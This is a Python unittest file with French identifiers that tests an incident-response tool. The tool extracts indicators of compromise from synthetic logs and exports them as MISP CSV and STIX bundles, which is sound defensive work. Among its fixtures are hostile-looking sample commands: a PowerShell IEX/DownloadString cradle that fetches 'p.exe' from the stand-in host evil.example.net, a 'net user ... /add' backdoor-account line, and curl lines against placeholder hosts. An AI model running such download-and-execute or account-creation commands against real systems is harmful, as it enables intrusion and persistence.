import csv
import json
import os
import shutil
import tempfile
import unittest
from datetime import datetime, timezone

from investigation import (charger_logs, etape1_detection, etape2_pivot,
                           etape3_chronologie)
from iocs import (IOC, exporter_misp_csv, exporter_stix, extraire_iocs,
                  extraire_motifs)
from tests.jeu_synthetique import (IP_BRUTE, IP_SPRAY_A, IP_SPRAY_B,
                                   chemin_jeu_synthetique)

SHA = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
GENERE = datetime(2026, 5, 21, 8, 0, 0, tzinfo=timezone.utc)
DEPUIS = datetime(2026, 5, 20, 9, 0, 0, tzinfo=timezone.utc)


def construire_iocs():
    chemin = chemin_jeu_synthetique()
    try:
        evts = charger_logs(chemin)
    finally:
        os.remove(chemin)
    det = etape1_detection(evts)
    piv = etape2_pivot(evts, det)
    chronos = etape3_chronologie(evts, piv)
    return extraire_iocs(det, piv, chronos)


class TestIOC(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.iocs = construire_iocs()
        cls.par_cle = {(i.type_misp, i.valeur): i for i in cls.iocs}

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp)

    def test_extraction_synthetique(self):
        paires = set(self.par_cle)
        for attendu in (("ip-src", IP_SPRAY_A), ("ip-src", IP_SPRAY_B), ("ip-src", IP_BRUTE),
                        ("target-user", "u.trois"),
                        ("target-machine", "SRV-FILE02"), ("target-machine", "WKS-205"),
                        ("text", "adm_tmp"), ("text", "\\OneDriveSyncHelper"),
                        ("url", "http://evil.example.net/p.exe"),
                        ("domain", "evil.example.net"), ("sha256", SHA)):
            self.assertIn(attendu, paires)

    def test_pas_de_faux_positifs(self):
        # pas de domaine pris pour un nom de compte ou de fichier, pas d'ip-dst en double
        self.assertNotIn(("domain", "u.trois"), self.par_cle)
        self.assertEqual([i for i in self.iocs if i.type_misp == "ip-dst"], [])

    def test_mapping_et_roles(self):
        attendu = {
            ("ip-src", IP_SPRAY_A): ("Network activity", True, "ip_attaque"),
            ("url", "http://evil.example.net/p.exe"): ("Network activity", True, "reseau"),
            ("domain", "evil.example.net"): ("Network activity", True, "reseau"),
            ("sha256", SHA): ("Payload delivery", True, "hash"),
            ("text", "adm_tmp"): ("Persistence mechanism", False, "compte_cree"),
            ("text", "\\OneDriveSyncHelper"): ("Persistence mechanism", False, "tache"),
            ("target-user", "u.trois"): ("Targeting data", False, "compte_compromis"),
            ("target-machine", "SRV-FILE02"): ("Targeting data", False, "machine"),
            ("target-machine", "WKS-205"): ("Targeting data", False, "machine"),
        }
        for cle, (cat, ids, role) in attendu.items():
            i = self.par_cle[cle]
            self.assertEqual((i.categorie_misp, i.to_ids, i.role), (cat, ids, role), cle)
        cmds = [i for i in self.iocs if i.role == "commande"]
        self.assertTrue(cmds)
        for c in cmds:
            self.assertEqual((c.type_misp, c.categorie_misp, c.to_ids),
                             ("text", "Payload installation", False))
        self.assertTrue(any("certutil" in c.valeur for c in cmds))

    def test_commentaires_valeurs_reelles(self):
        c = self.par_cle[("ip-src", IP_SPRAY_A)].commentaire
        self.assertIn("password spraying", c)
        self.assertIn("12 échecs sur 6 comptes", c)
        self.assertIn("09:00", c)
        c = self.par_cle[("text", "adm_tmp")].commentaire
        self.assertIn("Compte créé par l'attaquant sur SRV-FILE02 à 09:18", c)
        self.assertIn("force brute", self.par_cle[("ip-src", IP_BRUTE)].commentaire)

    def test_pas_de_faux_domaine(self):
        self.assertEqual(
            [t for t, _ in extraire_motifs("powershell.exe -nop C:\\Temp\\p.exe")], [])

    def test_domaines_tld_connus(self):
        faux = ["IEX (New-Object Net.WebClient).DownloadString('http://evil.example.net/p.exe')",
                "[System.Text.Encoding]::UTF8", "net user a.durand P@ss /add",
                "j.martin", "a.durand", "p.exe"]
        for texte in faux:
            doms = {v for t, v in extraire_motifs(texte) if t == "domain"}
            self.assertNotIn("net.webclient", doms)
            self.assertNotIn("system.text.encoding", doms)
            self.assertFalse(doms & {"a.durand", "j.martin", "p.exe"}, texte)
        p = set(extraire_motifs(faux[0]))
        self.assertIn(("url", "http://evil.example.net/p.exe"), p)
        self.assertIn(("domain", "evil.example.net"), p)
        self.assertEqual({v for t, v in p if t == "domain"}, {"evil.example.net"})
        self.assertEqual(extraire_motifs("j.martin"), [])
        self.assertIn(("domain", "evil.example.net"), extraire_motifs("evil.example.net"))
        # hôte d'URL conservé même avec un TLD hors liste
        self.assertIn(("domain", "c2.exemple.zzz"), extraire_motifs("http://c2.exemple.zzz/x"))

    def test_url_malformee_sans_exception(self):
        for texte in ("curl http://[::1/x", "http://[abc"):
            paires = extraire_motifs(texte)  # ne doit pas lever
            self.assertEqual([t for t, _ in paires if t == "domain"], [])
            self.assertEqual([t for t, _ in paires if t == "url"], ["url"])

    def test_extraction_champ_destination(self):
        from types import SimpleNamespace as N
        evt = N(timestamp=DEPUIS, event_id=4688, host="H1", account="u",
                details={"destination": "evil.example.net", "task_name": "x.example.com",
                         "member": "a.b.com"})
        q = N(evt=evt, nature="processus_benin", commande_decodee=None)
        ch = N(evenements=[q], comptes_suivis=["u"])
        piv = N(compromissions=[])
        r = extraire_iocs(N(suspectes=[]), piv, [ch])
        self.assertEqual([(i.type_misp, i.valeur) for i in r], [("domain", "evil.example.net")])
        self.assertIn("dans le champ destination", r[0].commentaire)

    def test_motifs(self):
        texte = ("curl http://a.example.org:8080/x?y=1 et 10.1.2.3 "
                 "md5 d41d8cd98f00b204e9800998ecf8427e sha1 da39a3ee5e6b4b0d3255bfef95601890afd80709 "
                 + SHA + " 999.1.1.1")
        paires = set(extraire_motifs(texte))
        self.assertIn(("url", "http://a.example.org:8080/x?y=1"), paires)
        self.assertIn(("domain", "a.example.org"), paires)
        self.assertIn(("ip-dst", "10.1.2.3"), paires)
        self.assertIn(("md5", "d41d8cd98f00b204e9800998ecf8427e"), paires)
        self.assertIn(("sha1", "da39a3ee5e6b4b0d3255bfef95601890afd80709"), paires)
        self.assertIn(("sha256", SHA), paires)
        self.assertNotIn(("ip-dst", "999.1.1.1"), paires)
        self.assertEqual(len([p for p in paires if p[0] in ("md5", "sha1")]), 2)

    def test_dedoublonnage(self):
        self.assertEqual(len(self.iocs), len({(i.type_misp, i.valeur) for i in self.iocs}))

    def test_csv_misp(self):
        chemin = os.path.join(self.tmp, "m.csv")
        iocs = list(self.iocs)
        iocs[0] = IOC(**{**iocs[0].__dict__, "statut_enrichissement": "5 moteurs malveillants"})
        exporter_misp_csv(iocs, chemin)
        with open(chemin, newline="", encoding="utf-8") as f:
            lignes = list(csv.reader(f))
        self.assertEqual(lignes[0], ["value", "type", "category", "to_ids", "comment"])
        self.assertEqual(len(lignes) - 1, len(iocs))
        self.assertIn([IP_SPRAY_A, "ip-src", "Network activity", "1"],
                      [l[:4] for l in lignes[1:]])
        self.assertIn(["adm_tmp", "text", "Persistence mechanism", "0"],
                      [l[:4] for l in lignes[1:]])
        self.assertTrue(lignes[1][4].endswith(" | VT : 5 moteurs malveillants"))

    def test_stix(self):
        chemin = os.path.join(self.tmp, "s.json")
        b = exporter_stix(self.iocs, chemin, GENERE, DEPUIS)
        with open(chemin, encoding="utf-8") as f:
            self.assertEqual(json.load(f), b)
        self.assertEqual(b["type"], "bundle")
        objs = b["objects"]
        rapport = [o for o in objs if o["type"] == "report"][0]
        identite = [o for o in objs if o["type"] == "identity"][0]
        ids = {o["id"] for o in objs}
        self.assertTrue(set(rapport["object_refs"]) <= ids)
        self.assertNotIn(identite["id"], rapport["object_refs"])
        self.assertEqual(rapport["name"], "Incident - investigation automatisée")
        self.assertEqual(rapport["report_types"], ["incident"])
        self.assertEqual(rapport["published"], "2026-05-21T08:00:00.000Z")
        patterns = {o.get("pattern") for o in objs}
        self.assertIn(f"[ipv4-addr:value = '{IP_SPRAY_A}']", patterns)
        self.assertIn("[domain-name:value = 'evil.example.net']", patterns)
        self.assertIn("[url:value = 'http://evil.example.net/p.exe']", patterns)
        self.assertIn(f"[file:hashes.'SHA-256' = '{SHA}']", patterns)
        ind = [o for o in objs if o["type"] == "indicator"]
        for o in ind:
            self.assertEqual(o["pattern_type"], "stix")
            self.assertEqual(o["indicator_types"], ["malicious-activity"])
            self.assertEqual(o["valid_from"], "2026-05-20T09:00:00.000Z")
            self.assertEqual(o["created_by_ref"], identite["id"])
            self.assertTrue(o["description"])
        comptes = {o["user_id"] for o in objs if o["type"] == "user-account"}
        self.assertEqual(comptes, {"u.trois", "adm_tmp"})
        for o in objs:
            if o["type"] == "user-account":
                self.assertEqual(o["spec_version"], "2.1")
                for k in ("created", "modified", "created_by_ref"):
                    self.assertNotIn(k, o)
        blob = json.dumps(b)
        self.assertNotIn("OneDriveSyncHelper", blob)  # tâches/commandes : MISP seulement
        self.assertNotIn("SRV-FILE02", [o.get("user_id") for o in objs])

    def test_stix_ids_stables(self):
        b1 = exporter_stix(self.iocs, os.path.join(self.tmp, "a.json"), GENERE, DEPUIS)
        b2 = exporter_stix(construire_iocs(), os.path.join(self.tmp, "b.json"), GENERE, DEPUIS)
        self.assertEqual({o["id"] for o in b1["objects"]}, {o["id"] for o in b2["objects"]})

    def test_stix_sans_ioc(self):
        b = exporter_stix([], os.path.join(self.tmp, "v.json"), GENERE, DEPUIS)
        self.assertEqual({o["type"] for o in b["objects"]}, {"identity", "report"})


if __name__ == "__main__":
    unittest.main()
